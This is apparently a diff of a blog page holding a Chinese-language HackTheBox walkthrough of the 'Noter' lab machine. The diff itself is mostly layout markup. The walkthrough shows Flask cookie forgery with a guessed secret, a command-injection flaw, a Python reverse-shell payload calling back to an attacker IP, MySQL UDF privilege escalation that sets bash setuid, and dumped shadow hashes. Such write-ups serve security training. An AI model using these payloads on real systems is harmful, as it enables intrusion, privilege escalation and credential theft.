@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;467 10.10.11.160   端口扫描21,22,5000: 123456789101112131415161718$ nmap -sC -sV 10.10.11.160Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-05-11 13:">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;467 10.10.11.160                                                                                                              端口扫描21,22,5000: 1234">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Noter - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/05/11/Noter-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;467 10.10.11.160   端口扫描21,22,5000: 123456789101112131415161718$ nmap -sC -sV 10.10.11.160Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-05-11 13:">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;467 10.10.11.160                                                                                                              端口扫描21,22,5000: 1234">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022051101.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022051102.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022051103.jpg">
@@ -133,7 +133,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -222,18 +222,39 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/467" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/467</a></li>
 <li>10.10.11.160</li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051101.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051101.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>21,22,5000:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.160</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 13:19 CST</span><br><span class="line">Nmap scan report for 10.10.11.160</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)</span><br><span class="line">|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)</span><br><span class="line">|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)</span><br><span class="line">5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)</span><br><span class="line">|_http-title: Noter</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 51.40 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="5000"><a href="#5000" class="headerlink" title="5000"></a>5000</h2><p>Flask写的note app：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051102.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051102.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="Noter"><a href="#Noter" class="headerlink" title="Noter"></a>Noter</h1><p>注册登录,得到的cookie看起来像JWT，实际上根据flask可以知道是flask sign：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWlhbyJ9.YntLnA.yERWWVo5V4fLXiftDggYNLqSksI</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051103.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051103.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="Flask-Unsign"><a href="#Flask-Unsign" class="headerlink" title="Flask-Unsign"></a>Flask-Unsign</h2><ul>
 <li>Paradoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys.<br><a href="https://github.com/Paradoxis/Flask-Unsign" target="_blank" rel="noopener">https://github.com/Paradoxis/Flask-Unsign</a></li>
 </ul>
@@ -242,28 +263,77 @@
 
 <h2 id="username"><a href="#username" class="headerlink" title="username"></a>username</h2><p>根据密钥可以伪造任意cookie，但用户名并不是常规的admin之类，需要爆破一下，登录那里简单测试一下就可以知道能够枚举用户名，用户名存在和不存在的响应不同：</p>
 <p>用户名字典用seclist里的cirt-default-usernames.txt就可以：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051104.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051104.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h2><p>生成blue的cookie，替换登录：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> flask-unsign --sign --cookie <span class="string">"&#123;'logged_in': True, 'username': 'blue'&#125;"</span> --secret <span class="string">'secret123'</span></span></span><br><span class="line">eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YntP4g.ljsRVa4c5NTGAVwcUYGlpihL1Tc</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051105.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051105.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p>blue的notes里得到ftp密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your username is &#39;blue&#39; and the password is &#39;blue@Noter!&#39;.</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051106.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051106.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p>使用得到的账号密码登录ftp，可以得到一个pdf文件：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051107.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051107.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="policy-pdf"><a href="#policy-pdf" class="headerlink" title="policy.pdf"></a>policy.pdf</h2><p>是密码策略相关，里面给出了默认密码的生成规则：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051108.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051108.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>可以根据该规则得出ftp_admin的默认密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp_admin@Noter!</span><br></pre></td></tr></table></figure>
 
 <h2 id="ftp-admin"><a href="#ftp-admin" class="headerlink" title="ftp_admin"></a>ftp_admin</h2><p>使用ftp_admin账号密码登录，可以得到两个备份文件：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051109.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051109.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="app-backup"><a href="#app-backup" class="headerlink" title="app_backup"></a>app_backup</h1><p> 对比两个版本文件差异，可以得到数据库账号密码信息：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">Nildogg36</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051110.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051110.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>另外进行代码审计也可以很容易发现export_note_remote存在命令注入, 请求用户指定的url，响应信息拼接到command里</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = request.form[<span class="string">'url'</span>]</span><br><span class="line"></span><br><span class="line">r = pyrequest.get(url,allow_redirects=<span class="keyword">True</span>)</span><br><span class="line">rand_int = random.randint(<span class="number">1</span>,<span class="number">10000</span>)</span><br><span class="line">command = <span class="string">f"node misc/md-to-pdf.js  $'<span class="subst">&#123;r.text.strip()&#125;</span>' <span class="subst">&#123;rand_int&#125;</span>"</span></span><br><span class="line">subprocess.run(command, shell=<span class="keyword">True</span>, executable=<span class="string">"/bin/bash"</span>)</span><br></pre></td></tr></table></figure>
 
@@ -272,12 +342,35 @@
 <h2 id="export-note-remote"><a href="#export-note-remote" class="headerlink" title="export_note_remote"></a>export_note_remote</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Export remote</span></span><br><span class="line"><span class="meta">@app.route('/export_note_remote', methods=['POST'])</span></span><br><span class="line"><span class="meta">@is_logged_in</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_note_remote</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> check_VIP(session[<span class="string">'username'</span>]):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = request.form[<span class="string">'url'</span>]</span><br><span class="line"></span><br><span class="line">            status, error = parse_url(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (status <span class="keyword">is</span> <span class="keyword">True</span>) <span class="keyword">and</span> (error <span class="keyword">is</span> <span class="keyword">None</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    r = pyrequest.get(url,allow_redirects=<span class="keyword">True</span>)</span><br><span class="line">                    rand_int = random.randint(<span class="number">1</span>,<span class="number">10000</span>)</span><br><span class="line">                    command = <span class="string">f"node misc/md-to-pdf.js  $'<span class="subst">&#123;r.text.strip()&#125;</span>' <span class="subst">&#123;rand_int&#125;</span>"</span></span><br><span class="line">                    subprocess.run(command, shell=<span class="keyword">True</span>, executable=<span class="string">"/bin/bash"</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> os.path.isfile(attachment_dir + <span class="string">f'<span class="subst">&#123;str(rand_int)&#125;</span>.pdf'</span>):</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> send_file(attachment_dir + <span class="string">f'<span class="subst">&#123;str(rand_int)&#125;</span>.pdf'</span>, as_attachment=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">'export_note.html'</span>, error=<span class="string">"Error occured while exporting the !"</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">'export_note.html'</span>, error=<span class="string">"Error occured!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">'export_note.html'</span>, error=<span class="string">f"Error occured while exporting ! (<span class="subst">&#123;error&#125;</span>)"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'export_note.html'</span>, error=<span class="string">f"Error occured while exporting ! (<span class="subst">&#123;e&#125;</span>)"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">403</span>)</span><br></pre></td></tr></table></figure>
 
 <h1 id="命令注入-amp-user-flag"><a href="#命令注入-amp-user-flag" class="headerlink" title="命令注入 &amp; user flag"></a>命令注入 &amp; user flag</h1><p>就是根据分析结果那样，提交url，控制响应内容进行命令注入，getshell：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051111.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051112.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051111.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051112.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="shell-md"><a href="#shell-md" class="headerlink" title="shell.md"></a>shell.md</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.3&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; # &#39;</span><br></pre></td></tr></table></figure>
 
 <h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>svc用户目录得到user.txt:</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051113.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051113.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="UDF提权-amp-root-flag"><a href="#UDF提权-amp-root-flag" class="headerlink" title="UDF提权 &amp; root flag"></a>UDF提权 &amp; root flag</h1><p>写公钥进去后ssh登录，方便后续操作,因为前面得到有数据库账号密码还没有使用到，这里很容易想到相关的UDF：</p>
 <ul>
 <li><p>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) - Linux local Exploit<br><a href="https://www.exploit-db.com/exploits/1518" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/1518</a></p>
@@ -286,8 +379,22 @@
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c raptor_udf2.c</span><br><span class="line">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line"></span><br><span class="line">show variables like '%plugin%';</span><br><span class="line">/usr/lib/x86_64-linux-gnu/mariadb19/plugin/</span><br><span class="line"></span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file('/tmp/raptor_udf2.so'));</span><br><span class="line">select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';</span><br><span class="line">create function do_system returns integer soname 'raptor_udf2.so';</span><br><span class="line">select * from mysql.func;</span><br><span class="line">select do_system('id&gt; /tmp/out; chown svc /tmp/out');</span><br><span class="line"></span><br><span class="line">select do_system('chmod u+s /bin/bash');</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051114.jpg" alt=""></p>
-<h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051115.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051114.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022051115.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:$6$09RSjU3jIh&#x2F;2JW1u$8jlcYzW5Oyzgh&#x2F;TrlTPX5Wq2HMTA6zUooij&#x2F;9j0.NIttTYp4x0h6wmq8chrcdtvNpZzHlHzwsI8GesOKI3NYn.:18991:0:99999:7:::</span><br><span class="line">svc:$6$gTM.AIsgDue4r5AQ$wUBfUtg7&#x2F;svAcRTnsFv51KuMpeNP0cL6vqIR3608pzd0YsNNe0oxMwvY7iAGMCgMp7viiBLUwUaAZx4r6ljME&#x2F;:18988:0:99999:7:::</span><br><span class="line">ftp_admin:$6$gQyFQc6w7p83bBwZ$6zYRlPKPBp6GMgUI5mbojxOvyup7hqrQ5hfscnLkwvIimC6qO5a0taiju1vYQPSnzf.mO5TgCdo.5RiO9Gu7J0:19114:0:99999:7:::</span><br><span class="line">blue:$6$pNud9u&#x2F;1PdD8qPYi$cSe5FPCRGH5xjUiEMJ5tXSclSrWSz7gimtR2IcXiiVk0xNfSACcVgU3C4z69RnZHEQKrNO&#x2F;hIiUQdVTqlxb29.:19114:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
